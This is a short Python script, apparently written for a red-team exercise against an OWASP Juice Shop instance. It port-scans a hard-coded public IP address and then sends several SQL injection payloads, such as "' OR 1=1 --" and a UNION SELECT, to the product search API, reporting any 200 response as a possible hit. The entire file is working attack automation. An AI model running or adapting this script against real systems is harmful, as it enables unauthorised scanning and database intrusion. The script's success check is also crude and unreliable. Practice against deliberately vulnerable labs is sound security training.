import sys
import requests
import socket
import time

# CONFIGURATION
TARGET_IP = "13.127.220.254"  # <--- CONFIRM THIS IS YOUR TARGET IP
TARGET_URL = f"http://{TARGET_IP}/rest/products/search?q="

def banner():
    print("-" * 50)
    print(f"    RED TEAM AUTOMATION: Target {TARGET_IP}")
    print("-" * 50)

def scan_ports():
    print(f"\n[*] PHASE 1: Port Scanning (Reconnaissance)...")
    ports = [22, 80, 443, 3000, 8080]
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((TARGET_IP, port))
        if result == 0:
            print(f"    [+] Port {port} is OPEN")
        else:
            print(f"    [-] Port {port} is Closed")
        sock.close()

def simulate_sql_injection():
    print(f"\n[*] PHASE 2: Simulating SQL Injection Attack...")
    # These are common SQL payloads from OWASP Top 10
    payloads = [
        "' OR 1=1 --", 
        "' OR '1'='1", 
        "admin' --", 
        "' UNION SELECT 1,2,3 --"
    ]
    
    for payload in payloads:
        print(f"    [>] Launching payload: {payload}")
        try:
            # We send the attack to the Juice Shop 'Search' API
            full_url = TARGET_URL + payload
            response = requests.get(full_url)
            
            if response.status_code == 200:
                print(f"        [!] Server responded (Status 200) - Possible Hit!")
            else:
                print(f"        [.] Blocked or Failed (Status {response.status_code})")
        except Exception as e:
            print(f"    [!] Connection Error: {e}")
        time.sleep(1) # Wait a bit to not crash the server

if __name__ == "__main__":
    banner()
    scan_ports()
    simulate_sql_injection()
    print("\n[=] Attack Simulation Complete.")
